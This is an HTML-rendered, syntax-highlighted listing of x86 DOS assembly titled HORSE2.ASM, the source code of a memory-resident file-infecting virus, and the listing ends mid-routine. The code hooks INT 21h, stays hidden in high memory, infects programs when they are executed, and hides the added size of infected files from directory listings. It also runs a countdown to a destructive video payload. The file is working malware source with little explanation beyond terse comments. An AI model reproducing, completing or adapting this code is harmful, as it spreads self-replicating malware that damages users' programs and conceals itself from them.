<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>HORSE2.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0"> </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
 </span><span class="sc9">.code</span><span class="sc0">
 </span><span class="sc9">.radix</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

                        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
                        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">EntryPoint</span><span class="sc0">      </span><span class="sc1">; Call virus entry point</span><span class="sc0">

</span><span class="sc1">; Here begin virus by himself</span><span class="sc0">

</span><span class="sc5">EntryPoint</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">      </span><span class="sc1">; Restore in BP address of data area</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; Save BX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Save CX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Save ES</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">; Save DS</span><span class="sc0">
             </span><span class="sc6">CLC</span><span class="sc0">            </span><span class="sc1">; Clear carry flag</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B4Bh</span><span class="sc0">    </span><span class="sc1">; Load AX with self-check word</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Call int21</span><span class="sc0">
             </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">Install</span><span class="sc0">     </span><span class="sc1">; If virus is loaded CF==0</span><span class="sc0">

             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">; Save DS</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; Set DS point to PSP</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; SI=DI= virus CODE begin</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">     </span><span class="sc1">; include CALL in the beginning</span><span class="sc0">
             </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; Adjust different offsets</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">047Ch</span><span class="sc0">    </span><span class="sc1">; Compare virus code only</span><span class="sc0">
             </span><span class="sc6">CLD</span><span class="sc0">            </span><span class="sc1">; Clear direction</span><span class="sc0">
             </span><span class="sc6">REP</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">       </span><span class="sc1">; Repeat until equal</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">; Restore DS</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">; Set ES = DS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">ReturnControl</span><span class="sc0">   </span><span class="sc1">; If virus -&gt; return to file</span><span class="sc0">

</span><span class="sc5">Install</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FunCounter</span><span class="sc4">+</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">3456</span><span class="sc0">       </span><span class="sc1">;  Load generation counter</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">       </span><span class="sc1">; Move PSP segment in AX</span><span class="sc0">
             </span><span class="sc6">DEC</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Compute MCB of PSP</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Set DS to MCB</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0003</span><span class="sc4">],</span><span class="sc2">0050</span><span class="sc0"> </span><span class="sc1">; "Steal" some memory</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0002</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ????</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0050</span><span class="sc0">     </span><span class="sc1">; ????</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0002</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save new virus segment</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; DI=0</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; SI point to virus begin</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">     </span><span class="sc1">; Adjust CALL in the beginning</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; DS set to 0</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">int21handler</span><span class="sc0">  </span><span class="sc1">; Load BX with int 21 handler</span><span class="sc0">
             </span><span class="sc6">XCHG</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc2">0084</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; and set it in vector table</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int21off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; Save old vector offset</span><span class="sc0">
             </span><span class="sc6">XCHG</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">0086</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Set new int21 seg &amp; get old segment</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int21seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; Save old vector segment</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Set ES point to new virus seg</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; Set DS point to current virus seg (PSP)</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastByte</span><span class="sc0">  </span><span class="sc1">; Will move all virus</span><span class="sc0">
             </span><span class="sc6">REP</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">       </span><span class="sc1">; Move virus in hi memory (as Eddie)</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4BB4h</span><span class="sc0">    </span><span class="sc1">; Int21 is grabbed by virus</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; This SetUp virus function</span><span class="sc0">
</span><span class="sc5">ReturnControl</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">; Restore DS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Restore ES</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">ComFlag</span><span class="sc4">],</span><span class="sc2">43</span><span class="sc0">   </span><span class="sc1">; Check if host file is COM</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">ReturnCOM</span><span class="sc0">   </span><span class="sc1">; If COM -&gt; exit COM</span><span class="sc0">
</span><span class="sc5">ReturnEXE</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">First3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Load AX with old IP</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">First3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load AX with old CS</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">       </span><span class="sc1">; Load CX with current run segment</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Calculate PSP+10h</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save result in DI</span><span class="sc0">
             </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; In DX is now start segment</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; ???</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; ???</span><span class="sc0">
             </span><span class="sc6">CLI</span><span class="sc0">            </span><span class="sc1">; Disable interrupts</span><span class="sc0">
             </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
             </span><span class="sc6">STI</span><span class="sc0">
</span><span class="sc5">DoReturn</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; 009B</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; Push entry segment</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Push entry offset</span><span class="sc0">

             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Clear registers</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">   </span><span class="sc1">; Clear of AX may cause trouble</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">   </span><span class="sc1">; with several programs (as DISKCOPY)</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">   </span><span class="sc1">; AX must be saved on entry and restored</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">RETF</span><span class="sc0">       </span><span class="sc1">; Return control to EXE file</span><span class="sc0">

</span><span class="sc5">ReturnCOM</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; ???</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">; ???</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">First3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Load AX with first 2 instr</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0100</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; and restore them at file begin</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">First3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load AX with second 2 instr</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0102</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; and restore them at file begin</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">         </span><span class="sc1">; Set AX to entry offset</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; Set DX to entry segment</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0">    </span><span class="sc5">DoReturn</span><span class="sc0">            </span><span class="sc1">; Go to return code</span><span class="sc0">

</span><span class="sc5">FindFirstNext</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSHF</span><span class="sc0">          </span><span class="sc1">; Save flags</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dos21off</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call DOS</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; Save rezult of searching</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; DS:SI point to FCB with search argument</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Check for Extended FCB</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">NoDirCommand</span><span class="sc0">    </span><span class="sc1">; If FCB not extended then command is not DIR</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">      </span><span class="sc1">; Get DTA address; Result of search is in DTA</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load file time to AX</span><span class="sc0">
             </span><span class="sc6">AND</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">001Fh</span><span class="sc0">    </span><span class="sc1">; Mask seconds</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">001Fh</span><span class="sc0">    </span><span class="sc1">; Check if file  seconds are  62</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">NoDirCommand</span><span class="sc0">    </span><span class="sc1">; If seconds!=62 -&gt; file not infected</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">26h</span><span class="sc4">],</span><span class="sc2">0000</span><span class="sc0"> </span><span class="sc1">; Check file size, hi byte</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">AdjustSize</span><span class="sc0">  </span><span class="sc1">; If file bigger than 64K -&gt; immediate adjust</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastCode</span><span class="sc0"> </span><span class="sc1">; Check low byte of file size</span><span class="sc0">
             </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">NoDirCommand</span><span class="sc0">    </span><span class="sc1">; If file is less than virus -&gt; skip adjust</span><span class="sc0">
</span><span class="sc5">AdjustSize</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastCode</span><span class="sc0"> </span><span class="sc1">; Decrement file size with virus size</span><span class="sc0">
             </span><span class="sc6">SBB</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">26h</span><span class="sc4">],</span><span class="sc2">0000</span><span class="sc0"> </span><span class="sc1">; Decrement hi byte of size if need</span><span class="sc0">

</span><span class="sc5">NoDirCommand</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore registers</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">IRET</span><span class="sc0">           </span><span class="sc1">; Return to caller</span><span class="sc0">

</span><span class="sc5">HereIam</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; If AX==4B4B -&gt; so virus call me</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Set ES to virus segment</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">000C</span><span class="sc0">     </span><span class="sc1">; Set DI to virus code begin</span><span class="sc0">
             </span><span class="sc6">IRET</span><span class="sc0">           </span><span class="sc1">; Return to caller</span><span class="sc0">
</span><span class="sc5">Int21handler</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">      </span><span class="sc1">; If function is FindFirst</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">FindFirstNext</span><span class="sc0">   </span><span class="sc1">; If so -&gt; will adjust file size</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">      </span><span class="sc1">; If function is FindNext</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">FindFirstNext</span><span class="sc0">   </span><span class="sc1">; If so -&gt; will adjust file size</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B4Bh</span><span class="sc0">    </span><span class="sc1">; If AX==4B4B -&gt; Identification</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">HereIam</span><span class="sc0">  </span><span class="sc1">; function</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4BB4h</span><span class="sc0">    </span><span class="sc1">; Setup function</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">Continue</span><span class="sc0">    </span><span class="sc1">; Continue checking of AH</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">SetUp</span><span class="sc0">
</span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save important registers</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DI</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BP</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">

             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">      </span><span class="sc1">; If function CLOSE file handle</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">    </span><span class="sc1">; If function is EXEC file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">      </span><span class="sc1">; If so set AH to OPEN function</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">      </span><span class="sc1">; and infect file</span><span class="sc0">
</span><span class="sc5">ErrorProcess</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FunCounter</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Load nomer pored na function</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">  </span><span class="sc1">; If counter is != 0</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">AdjustFunCount</span><span class="sc0">  </span><span class="sc1">; then only decrease counter</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">VideoFuck</span><span class="sc0">   </span><span class="sc1">; else go to video fuck</span><span class="sc0">
</span><span class="sc5">AdjustFunCount</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">DEC</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">04A0h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">EndInt21</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Restore important registers</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
